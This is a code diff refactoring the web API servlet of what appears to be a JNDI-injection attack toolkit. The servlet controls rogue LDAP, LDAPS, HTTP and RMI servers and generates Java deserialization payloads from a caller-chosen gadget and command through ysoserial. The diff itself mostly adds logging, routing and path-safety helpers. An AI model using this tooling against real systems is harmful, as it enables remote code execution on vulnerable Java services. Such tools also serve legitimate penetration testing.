@@ -16,7 +16,6 @@ import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.Part;
-import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
@@ -24,10 +23,15 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
 import java.util.*;
 
 @MultipartConfig
 public class JettyApiServlet extends HttpServlet {
+
+    private static final Logger log = LogManager.getLogger(JettyApiServlet.class);
 
     @Override
     protected void service(HttpServletRequest req, HttpServletResponse resp) throws IOException {
@@ -40,62 +44,85 @@ public class JettyApiServlet extends HttpServlet {
         }
 
         try {
-            if ("/status".equals(path) && "GET".equalsIgnoreCase(req.getMethod())) {
-                handleStatus(resp);
-            } else if ("/servers/start".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
-                handleServersStart(req, resp);
-            } else if ("/servers/stop".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
-                handleServersStop(req, resp);
-            } else if ("/servers/toggle".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
-                handleServersToggle(req, resp);
-            } else if ("/gadgets".equals(path) && "GET".equalsIgnoreCase(req.getMethod())) {
-                handleGadgets(resp);
-            } else if ("/payload/generate".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
-                handlePayloadGenerate(req, resp);
-            } else if ("/config/update".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
-                handleConfigUpdate(req, resp);
-            } else if ("/config".equals(path) && "GET".equalsIgnoreCase(req.getMethod())) {
-                handleStatus(resp);
-            } else if ("/logs".equals(path) && "GET".equalsIgnoreCase(req.getMethod())) {
-                handleLogs(req, resp);
-            } else if ("/files".equals(path) && "GET".equalsIgnoreCase(req.getMethod())) {
-                handleFileList(resp);
-            } else if ("/files/download".equals(path) && "GET".equalsIgnoreCase(req.getMethod())) {
-                handleFileDownload(req, resp);
-            } else if ("/files/delete".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
-                handleFileDelete(req, resp);
-            } else if ("/files/upload".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
-                handleFileUpload(req, resp);
+            String method = req.getMethod();
+            if ("GET".equalsIgnoreCase(method)) {
+                handleGet(path, req, resp);
+            } else if ("POST".equalsIgnoreCase(method)) {
+                handlePost(path, req, resp);
             } else {
-                resp.setStatus(404);
-                resp.getWriter().write("{\"error\":\"Not found\"}");
+                sendNotFound(resp);
             }
+        } catch (IllegalArgumentException e) {
+            log.warn("Bad request: {}", e.getMessage());
+            resp.setStatus(400);
+            resp.getWriter().write("{\"success\":false,\"error\":\"" + WebUtils.escapeJson(e.getMessage()) + "\"}");
         } catch (Exception e) {
+            log.error("Request processing failed", e);
             resp.setStatus(500);
-            resp.getWriter().write("{\"success\":false,\"error\":\"" + escapeJson(e.getMessage()) + "\"}");
+            resp.getWriter().write("{\"success\":false,\"error\":\"" + WebUtils.escapeJson(e.getMessage()) + "\"}");
         }
     }
 
+    private void handleGet(String path, HttpServletRequest req, HttpServletResponse resp) throws Exception {
+        switch (path) {
+            case "/status":
+            case "/config":
+                handleStatus(resp);
+                break;
+            case "/gadgets":
+                handleGadgets(resp);
+                break;
+            case "/logs":
+                handleLogs(req, resp);
+                break;
+            case "/files":
+                handleFileList(resp);
+                break;
+            case "/files/download":
+                handleFileDownload(req, resp);
+                break;
+            default:
+                sendNotFound(resp);
+                break;
+        }
+    }
+
+    private void handlePost(String path, HttpServletRequest req, HttpServletResponse resp) throws Exception {
+        switch (path) {
+            case "/servers/start":
+                handleServersStart(req, resp);
+                break;
+            case "/servers/stop":
+                handleServersStop(req, resp);
+                break;
+            case "/servers/toggle":
+                handleServersToggle(req, resp);
+                break;
+            case "/payload/generate":
+                handlePayloadGenerate(req, resp);
+                break;
+            case "/config/update":
+                handleConfigUpdate(req, resp);
+                break;
+            case "/files/delete":
+                handleFileDelete(req, resp);
+                break;
+            case "/files/upload":
+                handleFileUpload(req, resp);
+                break;
+            default:
+                sendNotFound(resp);
+                break;
+        }
+    }
+
+    private void sendNotFound(HttpServletResponse resp) throws IOException {
+        resp.setStatus(404);
+        resp.getWriter().write("{\"error\":\"Not found\"}");
+    }
+
     private void handleStatus(HttpServletResponse resp) throws IOException {
-        Map<String, Object> status = new LinkedHashMap<>();
-        status.put("ldapRunning", LdapServer.isRunning);
-        status.put("ldapsRunning", LdapsServer.isRunning);
-        status.put("httpRunning", HTTPServer.isRunning);
-        status.put("rmiRunning", RMIServer.isRunning);
-        status.put("ip", Config.ip);
-        status.put("ldapPort", Config.ldapPort);
-        status.put("ldapsPort", Config.ldapsPort);
-        status.put("httpPort", Config.httpPort);
-        status.put("rmiPort", Config.rmiPort);
-        status.put("codeBase", Config.codeBase);
-        status.put("AESkey", Config.AESkey);
-        status.put("user", Config.USER);
-        status.put("PASSWD", Config.PASSWD);
-        status.put("TLSProxy", Config.TLSProxy);
-        status.put("keyPass", Config.keyPass);
-        status.put("certFile", Config.certFile);
-        status.put("version", "1.3.8");
-        resp.getWriter().write(JSON.toJSONString(status));
+        resp.getWriter().write(JSON.toJSONString(buildStatusMap()));
     }
 
     private void handleLogs(HttpServletRequest req, HttpServletResponse resp) throws IOException {
@@ -111,11 +138,11 @@ public class JettyApiServlet extends HttpServlet {
     }
 
     private void handleFileList(HttpServletResponse resp) throws IOException {
-        java.io.File dir = new java.io.File(".");
-        java.io.File[] files = dir.listFiles(File::isFile);
+        File dir = new File(".");
+        File[] files = dir.listFiles(File::isFile);
         List<Map<String, Object>> list = new ArrayList<>();
         if (files != null) {
-            for (java.io.File f : files) {
+            for (File f : files) {
                 Map<String, Object> item = new LinkedHashMap<>();
                 item.put("name", f.getName());
                 item.put("size", f.length());
@@ -134,20 +161,20 @@ public class JettyApiServlet extends HttpServlet {
             resp.getWriter().write("{\"error\":\"name required\"}");
             return;
         }
-        Path filePath = Paths.get(name);
+        Path filePath = WebUtils.resolveSafePath(name);
         if (!Files.exists(filePath)) {
             resp.setStatus(404);
             resp.getWriter().write("{\"error\":\"file not found\"}");
             return;
         }
         resp.setContentType("application/octet-stream");
-        resp.setHeader("Content-Disposition", "attachment; filename=\"" + name + "\"");
+        resp.setHeader("Content-Disposition", "attachment; filename=\"" + filePath.getFileName() + "\"");
         resp.setContentLengthLong(Files.size(filePath));
         Files.copy(filePath, resp.getOutputStream());
     }
 
     private void handleFileDelete(HttpServletRequest req, HttpServletResponse resp) throws IOException {
-        JSONObject json = readJson(req);
+        JSONObject json = WebUtils.readJson(req);
         String name = json.getString("name");
         Map<String, Object> result = new LinkedHashMap<>();
         if (name == null || name.isEmpty()) {
@@ -156,7 +183,7 @@ public class JettyApiServlet extends HttpServlet {
             resp.getWriter().write(JSON.toJSONString(result));
             return;
         }
-        Path filePath = Paths.get(name);
+        Path filePath = WebUtils.resolveSafePath(name);
         if (!Files.exists(filePath)) {
             result.put("success", false);
             result.put("error", "file not found");
@@ -181,7 +208,7 @@ public class JettyApiServlet extends HttpServlet {
             if (fileName == null || fileName.isEmpty()) {
                 fileName = "uploaded_file";
             }
-            Path targetPath = Paths.get(fileName);
+            Path targetPath = WebUtils.resolveSafePath(fileName);
             try (InputStream input = filePart.getInputStream()) {
                 Files.copy(input, targetPath, StandardCopyOption.REPLACE_EXISTING);
             }
@@ -196,66 +223,53 @@ public class JettyApiServlet extends HttpServlet {
     }
 
     private void handleServersStart(HttpServletRequest req, HttpServletResponse resp) throws IOException {
-        JSONObject json = readJson(req);
+        JSONObject json = WebUtils.readJson(req);
+        applyNetworkConfig(json);
+
         Map<String, Object> result = new LinkedHashMap<>();
         List<String> started = new ArrayList<>();
-        List<String> errors = new ArrayList<>();
 
         boolean startLdap = json.getBooleanValue("ldap");
         boolean startLdaps = json.getBooleanValue("ldaps");
         boolean startHttp = json.getBooleanValue("http");
         boolean startRmi = json.getBooleanValue("rmi");
 
-        if (json.containsKey("ip")) Config.ip = json.getString("ip");
-        if (json.containsKey("ldapPort")) Config.ldapPort = json.getIntValue("ldapPort");
-        if (json.containsKey("ldapsPort")) Config.ldapsPort = json.getIntValue("ldapsPort");
-        if (json.containsKey("httpPort")) Config.httpPort = json.getIntValue("httpPort");
-        if (json.containsKey("rmiPort")) Config.rmiPort = json.getIntValue("rmiPort");
-
         if (startLdap && !LdapServer.isRunning) {
-            new Thread(() -> { try { LdapServer.start(); } catch (Exception ignored) {} }, "ldap-starter").start();
+            new Thread(() -> { try { LdapServer.start(); } catch (Exception e) { log.error("Failed to start LDAP server", e); } }, "ldap-starter").start();
             started.add("LDAP");
         }
         if (startHttp && !HTTPServer.isRunning) {
-            new Thread(() -> { try { HTTPServer.start(); } catch (Exception ignored) {} }, "http-starter").start();
+            new Thread(() -> { try { HTTPServer.start(); } catch (Exception e) { log.error("Failed to start HTTP server", e); } }, "http-starter").start();
             started.add("HTTP");
         }
         if (startLdaps && !LdapsServer.isRunning) {
-            new Thread(() -> { try { LdapsServer.start(); } catch (Exception ignored) {} }, "ldaps-starter").start();
+            new Thread(() -> { try { LdapsServer.start(); } catch (Exception e) { log.error("Failed to start LDAPS server", e); } }, "ldaps-starter").start();
             started.add("LDAPS");
         }
         if (startRmi && !RMIServer.isRunning) {
-            new Thread(() -> { try { RMIServer.start(); } catch (Exception ignored) {} }, "rmi-starter").start();
+            new Thread(() -> { try { RMIServer.start(); } catch (Exception e) { log.error("Failed to start RMI server", e); } }, "rmi-starter").start();
             started.add("RMI");
         }
 
         result.put("started", started);
-        result.put("errors", errors);
+        result.put("errors", Collections.emptyList());
         result.put("success", true);
         resp.getWriter().write(JSON.toJSONString(result));
     }
 
     private void handleServersStop(HttpServletRequest req, HttpServletResponse resp) throws IOException {
-        JSONObject json = readJson(req);
-        Map<String, Object> result = new LinkedHashMap<>();
+        JSONObject json = WebUtils.readJson(req);
         String server = json.getString("server");
         if (server == null) {
-            result.put("success", false);
-            result.put("error", "server name required");
-            resp.getWriter().write(JSON.toJSONString(result));
+            sendError(resp, "server name required");
             return;
         }
-        switch (server.toLowerCase()) {
-            case "ldap": LdapServer.stop(); break;
-            case "ldaps": LdapsServer.stop(); break;
-            case "http": HTTPServer.stop(); break;
-            case "rmi": RMIServer.stop(); break;
-            default:
-                result.put("success", false);
-                result.put("error", "unknown server: " + server);
-                resp.getWriter().write(JSON.toJSONString(result));
-                return;
+        boolean stopped = stopServer(server.toLowerCase());
+        if (!stopped) {
+            sendError(resp, "unknown server: " + server);
+            return;
         }
+        Map<String, Object> result = new LinkedHashMap<>();
         result.put("success", true);
         result.put("server", server);
         result.put("status", buildStatusMap());
@@ -263,59 +277,23 @@ public class JettyApiServlet extends HttpServlet {
     }
 
     private void handleServersToggle(HttpServletRequest req, HttpServletResponse resp) throws IOException {
-        JSONObject json = readJson(req);
-        Map<String, Object> result = new LinkedHashMap<>();
+        JSONObject json = WebUtils.readJson(req);
         String server = json.getString("server");
         if (server == null) {
-            result.put("success", false);
-            result.put("error", "server name required");
-            resp.getWriter().write(JSON.toJSONString(result));
+            sendError(resp, "server name required");
             return;
         }
-        boolean nowRunning = false;
-        switch (server.toLowerCase()) {
-            case "ldap":
-                if (LdapServer.isRunning) {
-                    LdapServer.stop();
-                } else {
-                    new Thread(() -> { try { LdapServer.start(); } catch (Exception ignored) {} }, "ldap-toggler").start();
-                    nowRunning = true;
-                }
-                break;
-            case "ldaps":
-                if (LdapsServer.isRunning) {
-                    LdapsServer.stop();
-                } else {
-                    new Thread(() -> { try { LdapsServer.start(); } catch (Exception ignored) {} }, "ldaps-toggler").start();
-                    nowRunning = true;
-                }
-                break;
-            case "http":
-                if (HTTPServer.isRunning) {
-                    HTTPServer.stop();
-                } else {
-                    new Thread(() -> { try { HTTPServer.start(); } catch (Exception ignored) {} }, "http-toggler").start();
-                    nowRunning = true;
-                }
-                break;
-            case "rmi":
-                if (RMIServer.isRunning) {
-                    RMIServer.stop();
-                } else {
-                    new Thread(() -> { try { RMIServer.start(); } catch (Exception ignored) {} }, "rmi-toggler").start();
-                    nowRunning = true;
-                }
-                break;
-            default:
-                result.put("success", false);
-                result.put("error", "unknown server: " + server);
-                resp.getWriter().write(JSON.toJSONString(result));
-                return;
+        boolean[] nowRunning = {false};
+        boolean handled = toggleServer(server.toLowerCase(), nowRunning);
+        if (!handled) {
+            sendError(resp, "unknown server: " + server);
+            return;
         }
         try { Thread.sleep(800); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
+        Map<String, Object> result = new LinkedHashMap<>();
         result.put("success", true);
         result.put("server", server);
-        result.put("running", nowRunning);
+        result.put("running", nowRunning[0]);
         result.put("status", buildStatusMap());
         resp.getWriter().write(JSON.toJSONString(result));
     }
@@ -333,15 +311,14 @@ public class JettyApiServlet extends HttpServlet {
     }
 
     private void handlePayloadGenerate(HttpServletRequest req, HttpServletResponse resp) throws Exception {
-        JSONObject json = readJson(req);
-        Map<String, Object> result = new LinkedHashMap<>();
-
+        JSONObject json = WebUtils.readJson(req);
         String gadget = json.getString("gadget");
         String command = json.getString("command");
         String saveFilename = json.getString("filename");
         boolean encodeBase64 = json.getBooleanValue("encodeBase64");
 
         if (gadget == null || command == null) {
+            Map<String, Object> result = new LinkedHashMap<>();
             result.put("success", false);
             result.put("error", "gadget and command are required");
             resp.getWriter().write(JSON.toJSONString(result));
@@ -351,7 +328,7 @@ public class JettyApiServlet extends HttpServlet {
         boolean keepFile = (saveFilename != null && !saveFilename.trim().isEmpty());
         String filename = keepFile ? saveFilename.trim() : "1.ser";
 
-        java.util.List<String> argList = new java.util.ArrayList<>();
+        List<String> argList = new ArrayList<>();
         argList.add("-y");
         argList.add("-g");
         argList.add(gadget);
@@ -383,51 +360,41 @@ public class JettyApiServlet extends HttpServlet {
             argList.add(dirtyLengthVal.trim());
         }
 
-        ysoserial.run(argList.toArray(new String[0]));
-
         Path filePath = Paths.get(filename);
-        byte[] data = Files.readAllBytes(filePath);
+        try {
+            ysoserial.run(argList.toArray(new String[0]));
+            byte[] data = Files.readAllBytes(filePath);
 
-        result.put("success", true);
-        if (encodeBase64) {
-            String b64 = Base64.getEncoder().encodeToString(data);
-            result.put("message", b64);
+            Map<String, Object> result = new LinkedHashMap<>();
+            result.put("success", true);
+            if (encodeBase64) {
+                String b64 = Base64.getEncoder().encodeToString(data);
+                result.put("message", b64);
+                if (keepFile) {
+                    Files.write(filePath, b64.getBytes());
+                }
+            } else {
+                StringBuilder hex = new StringBuilder();
+                for (byte b : data) {
+                    hex.append(String.format("%02x", b));
+                }
+                result.put("message", hex.toString());
+            }
             if (keepFile) {
-                Files.write(filePath, b64.getBytes());
+                result.put("saved", filename);
             }
-        } else {
-            StringBuilder hex = new StringBuilder();
-            for (byte b : data) {
-                hex.append(String.format("%02x", b));
+            resp.getWriter().write(JSON.toJSONString(result));
+        } finally {
+            if (!keepFile) {
+                Files.deleteIfExists(filePath);
             }
-            result.put("message", hex.toString());
         }
-        if (!keepFile) {
-            Files.deleteIfExists(filePath);
-        }
-        if (keepFile) {
-            result.put("saved", filename);
-        }
-        resp.getWriter().write(JSON.toJSONString(result));
     }
 
     private void handleConfigUpdate(HttpServletRequest req, HttpServletResponse resp) throws IOException {
-        JSONObject json = readJson(req);
+        JSONObject json = WebUtils.readJson(req);
+        applyFullConfig(json);
         Map<String, Object> result = new LinkedHashMap<>();
-
-        if (json.containsKey("ip")) Config.ip = json.getString("ip");
-        if (json.containsKey("ldapPort")) Config.ldapPort = json.getIntValue("ldapPort");
-        if (json.containsKey("ldapsPort")) Config.ldapsPort = json.getIntValue("ldapsPort");
-        if (json.containsKey("httpPort")) Config.httpPort = json.getIntValue("httpPort");
-        if (json.containsKey("rmiPort")) Config.rmiPort = json.getIntValue("rmiPort");
-        if (json.containsKey("codeBase")) Config.codeBase = json.getString("codeBase");
-        if (json.containsKey("AESkey")) Config.AESkey = json.getString("AESkey");
-        if (json.containsKey("user")) Config.USER = json.getString("user");
-        if (json.containsKey("PASSWD")) Config.PASSWD = json.getString("PASSWD");
-        if (json.containsKey("TLSProxy")) Config.TLSProxy = json.getBooleanValue("TLSProxy");
-        if (json.containsKey("keyPass")) Config.keyPass = json.getString("keyPass");
-        if (json.containsKey("certFile")) Config.certFile = json.getString("certFile");
-
         result.put("success", true);
         result.put("config", buildStatusMap());
         resp.getWriter().write(JSON.toJSONString(result));
@@ -455,25 +422,61 @@ public class JettyApiServlet extends HttpServlet {
         return status;
     }
 
-    private JSONObject readJson(HttpServletRequest req) throws IOException {
-        StringBuilder sb = new StringBuilder();
-        try (BufferedReader reader = req.getReader()) {
-            String line;
-            while ((line = reader.readLine()) != null) {
-                sb.append(line);
-            }
-        }
-        String body = sb.toString();
-        if (body.isEmpty()) return new JSONObject();
-        return JSON.parseObject(body);
+    private void applyNetworkConfig(JSONObject json) {
+        if (json.containsKey("ip")) Config.ip = json.getString("ip");
+        if (json.containsKey("ldapPort")) Config.ldapPort = json.getIntValue("ldapPort");
+        if (json.containsKey("ldapsPort")) Config.ldapsPort = json.getIntValue("ldapsPort");
+        if (json.containsKey("httpPort")) Config.httpPort = json.getIntValue("httpPort");
+        if (json.containsKey("rmiPort")) Config.rmiPort = json.getIntValue("rmiPort");
     }
 
-    private String escapeJson(String s) {
-        if (s == null) return "null";
-        return s.replace("\\", "\\\\")
-                .replace("\"", "\\\"")
-                .replace("\n", "\\n")
-                .replace("\r", "\\r")
-                .replace("\t", "\\t");
+    private void applyFullConfig(JSONObject json) {
+        applyNetworkConfig(json);
+        if (json.containsKey("codeBase")) Config.codeBase = json.getString("codeBase");
+        if (json.containsKey("AESkey")) Config.AESkey = json.getString("AESkey");
+        if (json.containsKey("user")) Config.USER = json.getString("user");
+        if (json.containsKey("PASSWD")) Config.PASSWD = json.getString("PASSWD");
+        if (json.containsKey("TLSProxy")) Config.TLSProxy = json.getBooleanValue("TLSProxy");
+        if (json.containsKey("keyPass")) Config.keyPass = json.getString("keyPass");
+        if (json.containsKey("certFile")) Config.certFile = json.getString("certFile");
+    }
+
+    private boolean stopServer(String server) {
+        switch (server) {
+            case "ldap": LdapServer.stop(); return true;
+            case "ldaps": LdapsServer.stop(); return true;
+            case "http": HTTPServer.stop(); return true;
+            case "rmi": RMIServer.stop(); return true;
+            default: return false;
+        }
+    }
+
+    private boolean toggleServer(String server, boolean[] nowRunning) {
+        switch (server) {
+            case "ldap":
+                if (LdapServer.isRunning) { LdapServer.stop(); }
+                else { new Thread(() -> { try { LdapServer.start(); } catch (Exception e) { log.error("Failed to toggle LDAP server", e); } }, "ldap-toggler").start(); nowRunning[0] = true; }
+                return true;
+            case "ldaps":
+                if (LdapsServer.isRunning) { LdapsServer.stop(); }
+                else { new Thread(() -> { try { LdapsServer.start(); } catch (Exception e) { log.error("Failed to toggle LDAPS server", e); } }, "ldaps-toggler").start(); nowRunning[0] = true; }
+                return true;
+            case "http":
+                if (HTTPServer.isRunning) { HTTPServer.stop(); }
+                else { new Thread(() -> { try { HTTPServer.start(); } catch (Exception e) { log.error("Failed to toggle HTTP server", e); } }, "http-toggler").start(); nowRunning[0] = true; }
+                return true;
+            case "rmi":
+                if (RMIServer.isRunning) { RMIServer.stop(); }
+                else { new Thread(() -> { try { RMIServer.start(); } catch (Exception e) { log.error("Failed to toggle RMI server", e); } }, "rmi-toggler").start(); nowRunning[0] = true; }
+                return true;
+            default: return false;
+        }
+    }
+
+    private void sendError(HttpServletResponse resp, String error) throws IOException {
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("success", false);
+        result.put("error", error);
+        resp.getWriter().write(JSON.toJSONString(result));
     }
 }
